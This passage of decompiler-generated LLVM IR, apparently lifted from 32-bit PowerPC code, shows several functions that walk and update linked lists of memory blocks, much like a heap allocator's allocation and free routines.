  %v0_100090a0 = call i32 @function_100098c4()
  %v0_100090a8 = load i32, i32* %r27.global-to-local, align 4
  %v1_100090a8 = load i32, i32* @r30, align 4
  %v2_100090a8 = add i32 %v1_100090a8, %v0_100090a8
  %v1_100090ac = load i32, i32* @r31, align 4
  %v2_100090ac = sub i32 %v1_100090ac, %v1_100090a8
  %v4_100090b4 = call i32 @function_10009200(i32* nonnull @global_var_1001b278, i32 %v2_100090a8, i32 %v2_100090ac)
  store i32 %v4_100090b4, i32* %r27.global-to-local, align 4
  %v0_100090c0 = call i32 @function_100098c4()
  %v3_100090c4 = icmp eq i32 %v4_100090b4, 0
  br i1 %v3_100090c4, label %dec_label_pc_100090d8, label %dec_label_pc_100090cc

dec_label_pc_100090cc:                            ; preds = %dec_label_pc_10009094
  %v0_100090cc = load i32, i32* @r30, align 4
  %v2_100090cc = add i32 %v0_100090cc, %v4_100090b4
  %v1_100090d0 = load i32, i32* @r28, align 4
  %v2_100090d0 = add i32 %v1_100090d0, -4
  %v3_100090d0 = inttoptr i32 %v2_100090d0 to i32*
  store i32 %v2_100090cc, i32* %v3_100090d0, align 4
  br label %dec_label_pc_10009148

dec_label_pc_100090d8:                            ; preds = %dec_label_pc_10009094
  %v0_100090d8 = load i32, i32* @r31, align 4
  %v1_100090d8 = add i32 %v0_100090d8, -4
  store i32 %v1_100090d8, i32* @r3, align 4
  store i32 268472544, i32* @lr, align 4
  %v0_100090dc = call i32 @function_10008d68()
  store i32 %v0_100090dc, i32* @r3, align 4
  store i32 %v0_100090dc, i32* @r31, align 4
  %v3_100090e0 = icmp eq i32 %v0_100090dc, 0
  br i1 %v3_100090e0, label %dec_label_pc_100090e8, label %dec_label_pc_100090f0

dec_label_pc_100090e8:                            ; preds = %dec_label_pc_100090d8
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10009148

dec_label_pc_100090f0:                            ; preds = %dec_label_pc_100090d8
  %v0_100090f0 = load i32, i32* @r28, align 4
  store i32 %v0_100090f0, i32* @r4, align 4
  %v0_100090f4 = load i32, i32* @r30, align 4
  %v1_100090f4 = add i32 %v0_100090f4, -4
  store i32 %v1_100090f4, i32* @r5, align 4
  store i32 268472572, i32* @lr, align 4
  %v0_100090f8 = call i32 @function_100084c8()
  %v0_100090fc = load i32, i32* @r28, align 4
  store i32 %v0_100090fc, i32* @r3, align 4
  store i32 268472580, i32* @lr, align 4
  %v0_10009100 = call i32 @function_10008f30()
  %v0_10009104 = load i32, i32* @r31, align 4
  store i32 %v0_10009104, i32* @r28, align 4
  br label %dec_label_pc_10009148

dec_label_pc_1000910c:                            ; preds = %dec_label_pc_1000908c
  %v1_1000910c = add i32 %v0_1000910c, 28
  %v3_10009110 = icmp ugt i32 %v1_1000910c, %v3_1000907c
  br i1 %v3_10009110, label %dec_label_pc_10009148, label %dec_label_pc_10009118

dec_label_pc_10009118:                            ; preds = %dec_label_pc_1000910c
  store i32 ptrtoint (i32* @global_var_1001b304.370 to i32), i32* @r29, align 4
  %v0_10009124 = call i32 @function_100098c4()
  %v0_1000912c = load i32, i32* %r27.global-to-local, align 4
  %v1_1000912c = load i32, i32* @r31, align 4
  %v2_1000912c = add i32 %v1_1000912c, %v0_1000912c
  %v1_10009130 = load i32, i32* @r30, align 4
  %v2_10009130 = sub i32 %v1_10009130, %v1_1000912c
  store i32 268472636, i32* @lr, align 4
  %v4_10009138 = call i32 @function_100092e4(i32* nonnull @global_var_1001b278, i32 %v2_1000912c, i32 %v2_10009130)
  %v0_10009140 = call i32 @function_100098c4()
  %v0_10009144 = load i32, i32* @r31, align 4
  %v1_10009144 = load i32, i32* @r28, align 4
  %v2_10009144 = add i32 %v1_10009144, -4
  %v3_10009144 = inttoptr i32 %v2_10009144 to i32*
  store i32 %v0_10009144, i32* %v3_10009144, align 4
  br label %dec_label_pc_10009148

dec_label_pc_10009148:                            ; preds = %dec_label_pc_1000910c, %dec_label_pc_100090f0, %dec_label_pc_100090e8, %dec_label_pc_100090cc, %dec_label_pc_10009064, %dec_label_pc_10009118
  %v0_1000914c = load i32, i32* @r28, align 4
  ret i32 %v0_1000914c

; uselistorder directives
  uselistorder i32 %v1_1000912c, { 1, 0 }
  uselistorder i32 %v4_100090b4, { 1, 0, 2 }
  uselistorder i32 %v1_100090a8, { 1, 0 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_1001b278, { 0, 1, 3, 2, 4 }
  uselistorder i32 ()* @function_10008d68, { 2, 1, 0, 4, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3 }
  uselistorder i32 ()* @function_10008f30, { 6, 5, 9, 8, 7, 1, 0, 11, 10, 4, 3, 2 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10009148, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000908c, { 1, 0 }
}

define i32 @function_10009160(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009160:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_10009160 = inttoptr i32 %arg2 to i32*
  %v2_10009160 = load i32, i32* %v1_10009160, align 4
  %v1_10009164 = add i32 %v2_10009160, 3
  store i32 %v1_10009164, i32* %r9.global-to-local, align 4
  %v1_10009168 = call i32 @__asm_rlwinm(i32 %v1_10009164, i32 0, i32 0, i32 29)
  %v2_1000916c = icmp ugt i32 %v1_10009168, 11
  br i1 %v2_1000916c, label %dec_label_pc_100091f0.preheader, label %dec_label_pc_10009174

dec_label_pc_10009174:                            ; preds = %dec_label_pc_10009160
  br label %dec_label_pc_100091f0.preheader

dec_label_pc_100091f0.preheader:                  ; preds = %dec_label_pc_10009160, %dec_label_pc_10009174
  %storemerge20 = phi i32 [ 12, %dec_label_pc_10009174 ], [ %v1_10009168, %dec_label_pc_10009160 ]
  %v0_100091d4 = phi i32 [ 12, %dec_label_pc_10009174 ], [ %v1_10009168, %dec_label_pc_10009160 ]
  store i32 %storemerge20, i32* %r11.global-to-local, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* %r9.global-to-local, align 4
  %v3_100091f05 = icmp eq i32 %storemerge2, 0
  br i1 %v3_100091f05, label %dec_label_pc_100091f8, label %dec_label_pc_10009180

dec_label_pc_10009180:                            ; preds = %dec_label_pc_100091f0.preheader, %dec_label_pc_100091ec
  %v0_100091ec = phi i32 [ %storemerge, %dec_label_pc_100091ec ], [ %storemerge2, %dec_label_pc_100091f0.preheader ]
  %v1_10009180 = inttoptr i32 %v0_100091ec to i32*
  %v2_10009180 = load i32, i32* %v1_10009180, align 4
  store i32 %v2_10009180, i32* %r10.global-to-local, align 4
  %v2_10009184 = icmp ult i32 %v2_10009180, %v0_100091d4
  br i1 %v2_10009184, label %dec_label_pc_100091ec, label %dec_label_pc_1000918c

dec_label_pc_1000918c:                            ; preds = %dec_label_pc_10009180
  %v1_1000918c = add i32 %v0_100091d4, 44
  %v2_10009190 = icmp ult i32 %v2_10009180, %v1_1000918c
  br i1 %v2_10009190, label %dec_label_pc_10009198, label %dec_label_pc_100091d4

dec_label_pc_10009198:                            ; preds = %dec_label_pc_1000918c
  %v1_10009198 = add i32 %v0_100091ec, 4
  %v2_10009198 = inttoptr i32 %v1_10009198 to i32*
  %v3_10009198 = load i32, i32* %v2_10009198, align 4
  store i32 %v3_10009198, i32* %r11.global-to-local, align 4
  %v3_1000919c = icmp eq i32 %v3_10009198, 0
  br i1 %v3_1000919c, label %dec_label_pc_100091ac, label %dec_label_pc_100091a4

dec_label_pc_100091a4:                            ; preds = %dec_label_pc_10009198
  %v1_100091a4 = add i32 %v0_100091ec, 8
  %v2_100091a4 = inttoptr i32 %v1_100091a4 to i32*
  %v3_100091a4 = load i32, i32* %v2_100091a4, align 4
  %v2_100091a8 = add i32 %v3_10009198, 8
  %v3_100091a8 = inttoptr i32 %v2_100091a8 to i32*
  store i32 %v3_100091a4, i32* %v3_100091a8, align 4
  %v0_100091ac.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_100091c8.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100091ac

dec_label_pc_100091ac:                            ; preds = %dec_label_pc_10009198, %dec_label_pc_100091a4
  %v0_100091c8 = phi i32 [ %v2_10009180, %dec_label_pc_10009198 ], [ %v0_100091c8.pre, %dec_label_pc_100091a4 ]
  %v0_100091ac = phi i32 [ %v0_100091ec, %dec_label_pc_10009198 ], [ %v0_100091ac.pre, %dec_label_pc_100091a4 ]
  %v1_100091ac = add i32 %v0_100091ac, 8
  %v2_100091ac = inttoptr i32 %v1_100091ac to i32*
  %v3_100091ac = load i32, i32* %v2_100091ac, align 4
  %v1_100091b0 = add i32 %v0_100091ac, 4
  %v2_100091b0 = inttoptr i32 %v1_100091b0 to i32*
  %v3_100091b0 = load i32, i32* %v2_100091b0, align 4
  %v3_100091b4 = icmp eq i32 %v3_100091ac, 0
  store i32 %v0_100091c8, i32* %r11.global-to-local, align 4
  br i1 %v3_100091b4, label %dec_label_pc_100091c8, label %dec_label_pc_100091bc

dec_label_pc_100091bc:                            ; preds = %dec_label_pc_100091ac
  %v2_100091c0 = add i32 %v3_100091ac, 4
  %v3_100091c0 = inttoptr i32 %v2_100091c0 to i32*
  store i32 %v3_100091b0, i32* %v3_100091c0, align 4
  br label %dec_label_pc_100091dc

dec_label_pc_100091c8:                            ; preds = %dec_label_pc_100091ac
  store i32 %v3_100091b0, i32* %arg1, align 4
  br label %dec_label_pc_100091dc

dec_label_pc_100091d4:                            ; preds = %dec_label_pc_1000918c
  %v2_100091d4 = sub i32 %v2_10009180, %v0_100091d4
  store i32 %v2_100091d4, i32* %v1_10009180, align 4
  br label %dec_label_pc_100091dc

dec_label_pc_100091dc:                            ; preds = %dec_label_pc_100091c8, %dec_label_pc_100091bc, %dec_label_pc_100091d4
  %v0_100091dc = load i32, i32* %r10.global-to-local, align 4
  %v1_100091dc = load i32, i32* %r9.global-to-local, align 4
  %v2_100091dc = sub i32 %v1_100091dc, %v0_100091dc
  store i32 %v2_100091dc, i32* %r9.global-to-local, align 4
  %v0_100091e0 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100091e0, i32* %v1_10009160, align 4
  %v0_100091e4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100091e4 = add i32 %v0_100091e4, 12
  ret i32 %v1_100091e4

dec_label_pc_100091ec:                            ; preds = %dec_label_pc_10009180
  %v1_100091ec = add i32 %v0_100091ec, 4
  %storemerge.in = inttoptr i32 %v1_100091ec to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v3_100091f0 = icmp eq i32 %storemerge, 0
  br i1 %v3_100091f0, label %dec_label_pc_100091f0.dec_label_pc_100091f8_crit_edge, label %dec_label_pc_10009180

dec_label_pc_100091f0.dec_label_pc_100091f8_crit_edge: ; preds = %dec_label_pc_100091ec
  br label %dec_label_pc_100091f8

dec_label_pc_100091f8:                            ; preds = %dec_label_pc_100091f0.dec_label_pc_100091f8_crit_edge, %dec_label_pc_100091f0.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_100091ac, { 1, 0 }
  uselistorder i32 %v2_10009180, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_100091ec, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_100091d4, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 4, 5, 2, 1, 3, 6 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100091dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100091ac, { 1, 0 }
  uselistorder label %dec_label_pc_10009180, { 1, 0 }
  uselistorder label %dec_label_pc_100091f0.preheader, { 1, 0 }
}

define i32 @function_10009200(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10009200:
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_10009200 = load i32, i32* %arg1, align 4
  store i32 %v2_10009200, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v1_10009208 = add i32 %arg3, 3
  %v3_1000928c3 = icmp eq i32 %v2_10009200, 0
  br i1 %v3_1000928c3, label %dec_label_pc_10009294, label %dec_label_pc_10009210

dec_label_pc_10009210:                            ; preds = %dec_label_pc_10009200, %dec_label_pc_10009288
  %v0_10009288 = phi i32 [ %v3_10009288, %dec_label_pc_10009288 ], [ %v2_10009200, %dec_label_pc_10009200 ]
  %v1_10009210 = inttoptr i32 %v0_10009288 to i32*
  %v2_10009210 = load i32, i32* %v1_10009210, align 4
  %v2_10009214 = sub i32 %v0_10009288, %v2_10009210
  %v1_10009218 = add i32 %v2_10009214, 12
  %v3_1000921c = icmp ugt i32 %v1_10009218, %arg2
  br i1 %v3_1000921c, label %dec_label_pc_10009288, label %dec_label_pc_10009224

dec_label_pc_10009224:                            ; preds = %dec_label_pc_10009210
  %v4_1000921c = icmp eq i32 %v1_10009218, %arg2
  br i1 %v4_1000921c, label %dec_label_pc_1000922c, label %dec_label_pc_10009294

dec_label_pc_1000922c:                            ; preds = %dec_label_pc_10009224
  %v1_1000922c = call i32 @__asm_rlwinm(i32 %v1_10009208, i32 0, i32 0, i32 29)
  %v2_10009230 = icmp ult i32 %v2_10009210, %v1_1000922c
  br i1 %v2_10009230, label %dec_label_pc_10009294, label %dec_label_pc_10009238

dec_label_pc_10009238:                            ; preds = %dec_label_pc_1000922c
  %v1_10009238 = add i32 %v1_1000922c, 44
  %v2_1000923c = icmp ult i32 %v2_10009210, %v1_10009238
  br i1 %v2_1000923c, label %dec_label_pc_10009244, label %dec_label_pc_10009278

dec_label_pc_10009244:                            ; preds = %dec_label_pc_10009238
  %v0_10009244 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009244 = add i32 %v0_10009244, 4
  %v2_10009244 = inttoptr i32 %v1_10009244 to i32*
  %v3_10009244 = load i32, i32* %v2_10009244, align 4
  %v3_10009248 = icmp eq i32 %v3_10009244, 0
  br i1 %v3_10009248, label %dec_label_pc_10009258, label %dec_label_pc_10009250

dec_label_pc_10009250:                            ; preds = %dec_label_pc_10009244
  %v1_10009250 = add i32 %v0_10009244, 8
  %v2_10009250 = inttoptr i32 %v1_10009250 to i32*
  %v3_10009250 = load i32, i32* %v2_10009250, align 4
  %v2_10009254 = add i32 %v3_10009244, 8
  %v3_10009254 = inttoptr i32 %v2_10009254 to i32*
  store i32 %v3_10009250, i32* %v3_10009254, align 4
  %v0_10009258.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009258

dec_label_pc_10009258:                            ; preds = %dec_label_pc_10009244, %dec_label_pc_10009250
  %v0_10009258 = phi i32 [ %v0_10009244, %dec_label_pc_10009244 ], [ %v0_10009258.pre, %dec_label_pc_10009250 ]
  %v1_10009258 = add i32 %v0_10009258, 8
  %v2_10009258 = inttoptr i32 %v1_10009258 to i32*
  %v3_10009258 = load i32, i32* %v2_10009258, align 4
  %v1_1000925c = add i32 %v0_10009258, 4
  %v2_1000925c = inttoptr i32 %v1_1000925c to i32*
  %v3_1000925c = load i32, i32* %v2_1000925c, align 4
  %v3_10009260 = icmp eq i32 %v3_10009258, 0
  br i1 %v3_10009260, label %dec_label_pc_10009270, label %dec_label_pc_10009268

dec_label_pc_10009268:                            ; preds = %dec_label_pc_10009258
  %v2_10009268 = add i32 %v3_10009258, 4
  %v3_10009268 = inttoptr i32 %v2_10009268 to i32*
  store i32 %v3_1000925c, i32* %v3_10009268, align 4
  ret i32 %v2_10009210

dec_label_pc_10009270:                            ; preds = %dec_label_pc_10009258
  %v1_10009270 = load i32, i32* %r8.global-to-local, align 4
  %v2_10009270 = inttoptr i32 %v1_10009270 to i32*
  store i32 %v3_1000925c, i32* %v2_10009270, align 4
  ret i32 %v2_10009210

dec_label_pc_10009278:                            ; preds = %dec_label_pc_10009238
  %v2_10009278 = sub i32 %v2_10009210, %v1_1000922c
  %v1_10009280 = load i32, i32* %r11.global-to-local, align 4
  %v2_10009280 = inttoptr i32 %v1_10009280 to i32*
  store i32 %v2_10009278, i32* %v2_10009280, align 4
  ret i32 %v1_1000922c

dec_label_pc_10009288:                            ; preds = %dec_label_pc_10009210
  %v1_10009288 = add i32 %v0_10009288, 4
  %v2_10009288 = inttoptr i32 %v1_10009288 to i32*
  %v3_10009288 = load i32, i32* %v2_10009288, align 4
  store i32 %v3_10009288, i32* %r11.global-to-local, align 4
  %v3_1000928c = icmp eq i32 %v3_10009288, 0
  br i1 %v3_1000928c, label %dec_label_pc_1000928c.dec_label_pc_10009294.loopexit_crit_edge, label %dec_label_pc_10009210

dec_label_pc_1000928c.dec_label_pc_10009294.loopexit_crit_edge: ; preds = %dec_label_pc_10009288
  br label %dec_label_pc_10009294

dec_label_pc_10009294:                            ; preds = %dec_label_pc_10009200, %dec_label_pc_1000928c.dec_label_pc_10009294.loopexit_crit_edge, %dec_label_pc_10009224, %dec_label_pc_1000922c
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_10009288, { 1, 2, 0 }
  uselistorder i32 %v0_10009258, { 1, 0 }
  uselistorder i32 %v1_1000922c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10009210, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v0_10009288, { 0, 2, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 29, { 24, 26, 25, 27, 4, 5, 42, 43, 40, 41, 46, 47, 28, 29, 44, 45, 0, 1, 6, 20, 21, 7, 8, 9, 12, 13, 14, 15, 10, 11, 16, 17, 18, 19, 2, 22, 3, 23, 30, 31, 32, 33, 36, 37, 34, 35, 38, 39 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10009294, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10009258, { 1, 0 }
  uselistorder label %dec_label_pc_10009210, { 1, 0 }
}

define i32 @function_1000929c(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000929c:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000929c = icmp eq i32 %arg3, 0
  %v2_100092a0 = add i32 %arg2, 4
  %v3_100092a0 = inttoptr i32 %v2_100092a0 to i32*
  store i32 %arg4, i32* %v3_100092a0, align 4
  %v2_100092a4 = add i32 %arg2, 8
  %v3_100092a4 = inttoptr i32 %v2_100092a4 to i32*
  store i32 %arg3, i32* %v3_100092a4, align 4
  br i1 %v3_1000929c, label %dec_label_pc_100092b4, label %dec_label_pc_100092ac

dec_label_pc_100092ac:                            ; preds = %dec_label_pc_1000929c
  %v2_100092ac = add i32 %arg3, 4
  %v3_100092ac = inttoptr i32 %v2_100092ac to i32*
  store i32 %arg2, i32* %v3_100092ac, align 4
  br label %dec_label_pc_100092b8

dec_label_pc_100092b4:                            ; preds = %dec_label_pc_1000929c
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_100092b8

dec_label_pc_100092b8:                            ; preds = %dec_label_pc_100092ac, %dec_label_pc_100092b4
  %v3_100092b8 = icmp eq i32 %arg4, 0
  %v0_100092bc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100092b8, i32 %v0_100092bc)
  %v2_100092c0 = add i32 %arg4, 8
  %v3_100092c0 = inttoptr i32 %v2_100092c0 to i32*
  store i32 %arg2, i32* %v3_100092c0, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_100092b8, { 1, 0 }
}

define i32 @function_100092c8(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100092c8:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_100092c8 = icmp eq i32 %arg3, 0
  br i1 %v3_100092c8, label %dec_label_pc_100092d8, label %dec_label_pc_100092d0

dec_label_pc_100092d0:                            ; preds = %dec_label_pc_100092c8
  %v2_100092d0 = add i32 %arg3, 4
  %v3_100092d0 = inttoptr i32 %v2_100092d0 to i32*
  store i32 %arg2, i32* %v3_100092d0, align 4
  br label %dec_label_pc_100092dc

dec_label_pc_100092d8:                            ; preds = %dec_label_pc_100092c8
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_100092dc

dec_label_pc_100092dc:                            ; preds = %dec_label_pc_100092d0, %dec_label_pc_100092d8
  %v2_100092dc = add i32 %arg2, 8
  %v3_100092dc = inttoptr i32 %v2_100092dc to i32*
  store i32 %arg3, i32* %v3_100092dc, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100092dc, { 1, 0 }
}

define i32 @function_100092e4(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100092e4:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_100092fc = load i32, i32* %arg1, align 4
  store i32 %v2_100092fc, i32* @r31, align 4
  %v2_10009300 = add i32 %arg3, %arg2
  store i32 %v2_10009300, i32* %r3.global-to-local, align 4
  %v3_100093147 = icmp eq i32 %v2_100092fc, 0
  %v1_100093188 = add i32 %v2_100092fc, 12
  %tmp69 = icmp uge i32 %v1_100093188, %arg2
  %or.cond10 = or i1 %v3_100093147, %tmp69
  br i1 %or.cond10, label %dec_label_pc_10009324, label %dec_label_pc_1000930c

dec_label_pc_1000930c:                            ; preds = %dec_label_pc_100092e4, %dec_label_pc_1000930c
  %v0_1000936c11 = phi i32 [ %v3_10009310, %dec_label_pc_1000930c ], [ %v2_100092fc, %dec_label_pc_100092e4 ]
  store i32 %v0_1000936c11, i32* %r11.global-to-local, align 4
  %v1_10009310 = add i32 %v0_1000936c11, 4
  %v2_10009310 = inttoptr i32 %v1_10009310 to i32*
  %v3_10009310 = load i32, i32* %v2_10009310, align 4
  store i32 %v3_10009310, i32* @r31, align 4
  %v3_10009314 = icmp eq i32 %v3_10009310, 0
  %v1_10009318 = add i32 %v3_10009310, 12
  %tmp6 = icmp uge i32 %v1_10009318, %arg2
  %or.cond = or i1 %v3_10009314, %tmp6
  br i1 %or.cond, label %dec_label_pc_10009324, label %dec_label_pc_1000930c

dec_label_pc_10009324:                            ; preds = %dec_label_pc_1000930c, %dec_label_pc_100092e4
  %v0_10009360.lcssa = phi i32 [ 0, %dec_label_pc_100092e4 ], [ %v0_1000936c11, %dec_label_pc_1000930c ]
  %v0_1000936c.lcssa = phi i32 [ %v2_100092fc, %dec_label_pc_100092e4 ], [ %v3_10009310, %dec_label_pc_1000930c ]
  %v3_10009314.lcssa = phi i1 [ %v3_100093147, %dec_label_pc_100092e4 ], [ %v3_10009314, %dec_label_pc_1000930c ]
  br i1 %v3_10009314.lcssa, label %dec_label_pc_100093dc, label %dec_label_pc_1000932c

dec_label_pc_1000932c:                            ; preds = %dec_label_pc_10009324
  %v1_1000932c = inttoptr i32 %v0_1000936c.lcssa to i32*
  %v2_1000932c = load i32, i32* %v1_1000932c, align 4
  %v2_10009330 = sub i32 %v0_1000936c.lcssa, %v2_1000932c
  %v1_10009334 = add i32 %v2_10009330, 12
  %v3_10009338 = icmp ugt i32 %v1_10009334, %v2_10009300
  br i1 %v3_10009338, label %dec_label_pc_100093dc, label %dec_label_pc_10009340

dec_label_pc_10009340:                            ; preds = %dec_label_pc_1000932c
  %v4_10009338 = icmp eq i32 %v1_10009334, %v2_10009300
  %v2_10009344 = add i32 %v2_1000932c, %arg3
  store i32 %v2_10009344, i32* @r29, align 4
  br i1 %v4_10009338, label %dec_label_pc_1000934c, label %dec_label_pc_1000937c

dec_label_pc_1000934c:                            ; preds = %dec_label_pc_10009340
  %v3_1000934c = icmp eq i32 %v0_10009360.lcssa, 0
  br i1 %v3_1000934c, label %dec_label_pc_100093d0, label %dec_label_pc_10009354

dec_label_pc_10009354:                            ; preds = %dec_label_pc_1000934c
  %v1_10009354 = add i32 %v0_10009360.lcssa, 12
  %v4_10009358 = icmp eq i32 %v1_10009354, %arg2
  br i1 %v4_10009358, label %dec_label_pc_10009360, label %dec_label_pc_100093d0

dec_label_pc_10009360:                            ; preds = %dec_label_pc_10009354
  %v1_10009360 = inttoptr i32 %v0_10009360.lcssa to i32*
  %v2_10009360 = load i32, i32* %v1_10009360, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_10009368 = add i32 %v0_10009360.lcssa, 8
  %v2_10009368 = inttoptr i32 %v1_10009368 to i32*
  %v3_10009368 = load i32, i32* %v2_10009368, align 4
  %v2_10009370 = add i32 %v2_10009360, %v2_10009344
  store i32 %v2_10009370, i32* @r29, align 4
  %v5_10009374 = call i32 @function_100092c8(i32* %arg1, i32 %v0_1000936c.lcssa, i32 %v3_10009368, i32 %v2_10009300)
  store i32 %v5_10009374, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100093d0

dec_label_pc_1000937c:                            ; preds = %dec_label_pc_10009340
  %v1_1000937c = add i32 %v0_1000936c.lcssa, 4
  %v2_1000937c = inttoptr i32 %v1_1000937c to i32*
  %v3_1000937c = load i32, i32* %v2_1000937c, align 4
  %v3_10009380 = icmp eq i32 %v3_1000937c, 0
  br i1 %v3_10009380, label %dec_label_pc_100093b8, label %dec_label_pc_10009388

dec_label_pc_10009388:                            ; preds = %dec_label_pc_1000937c
  %v1_10009388 = inttoptr i32 %v3_1000937c to i32*
  %v2_10009388 = load i32, i32* %v1_10009388, align 4
  %v2_1000938c = sub i32 %v3_1000937c, %v2_10009388
  %v1_10009390 = add i32 %v2_1000938c, 12
  %v4_10009394 = icmp eq i32 %v2_10009300, %v1_10009390
  br i1 %v4_10009394, label %dec_label_pc_1000939c, label %dec_label_pc_100093b8

dec_label_pc_1000939c:                            ; preds = %dec_label_pc_10009388
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_100093a8 = add i32 %v2_10009388, %v2_10009344
  store i32 %v2_100093a8, i32* @r29, align 4
  store i32 %v3_1000937c, i32* @r31, align 4
  %v5_100093b0 = call i32 @function_100092c8(i32* %arg1, i32 %v3_1000937c, i32 %v0_10009360.lcssa, i32 %v2_10009300)
  store i32 %v5_100093b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100093d0

dec_label_pc_100093b8:                            ; preds = %dec_label_pc_10009388, %dec_label_pc_1000937c
  %v2_100093b8 = add i32 %v0_1000936c.lcssa, %arg3
  store i32 %v2_100093b8, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268473296, i32* @lr, align 4
  %v5_100093cc = call i32 @function_1000929c(i32* %arg1, i32 %v2_100093b8, i32 %v0_10009360.lcssa, i32 %v3_1000937c)
  store i32 %v5_100093cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100093d0

dec_label_pc_100093d0:                            ; preds = %dec_label_pc_10009354, %dec_label_pc_1000934c, %dec_label_pc_1000939c, %dec_label_pc_10009360, %dec_label_pc_100093b8
  %v0_100093d0 = load i32, i32* @r31, align 4
  store i32 %v0_100093d0, i32* @r30, align 4
  %v0_100093d4 = load i32, i32* @r29, align 4
  %v2_100093d4 = inttoptr i32 %v0_100093d0 to i32*
  store i32 %v0_100093d4, i32* %v2_100093d4, align 4
  br label %dec_label_pc_100093f8

dec_label_pc_100093dc:                            ; preds = %dec_label_pc_1000932c, %dec_label_pc_10009324
  %v2_100093dc = add i32 %v2_10009300, -12
  %v3_100093dc = inttoptr i32 %v2_100093dc to i32*
  store i32 %arg3, i32* %v3_100093dc, align 4
  %v0_100093e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_100093e0 = add i32 %v0_100093e0, -12
  store i32 %v1_100093e0, i32* @r30, align 4
  %v0_100093e4 = load i32, i32* %r11.global-to-local, align 4
  %v0_100093e8 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_100093e8, i32* %r3.global-to-local, align 4
  %v0_100093ec = load i32, i32* @r31, align 4
  store i32 268473336, i32* @lr, align 4
  %v4_100093f4 = inttoptr i32 %v0_100093e8 to i32*
  %v5_100093f4 = call i32 @function_1000929c(i32* %v4_100093f4, i32 %v1_100093e0, i32 %v0_100093e4, i32 %v0_100093ec)
  store i32 %v5_100093f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100093f8

dec_label_pc_100093f8:                            ; preds = %dec_label_pc_100093d0, %dec_label_pc_100093dc
  %v0_100093fc = load i32, i32* @r30, align 4
  store i32 %v0_100093fc, i32* %r3.global-to-local, align 4
  ret i32 %v0_100093fc

; uselistorder directives
  uselistorder i32 %v3_1000937c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_10009334, { 1, 0 }
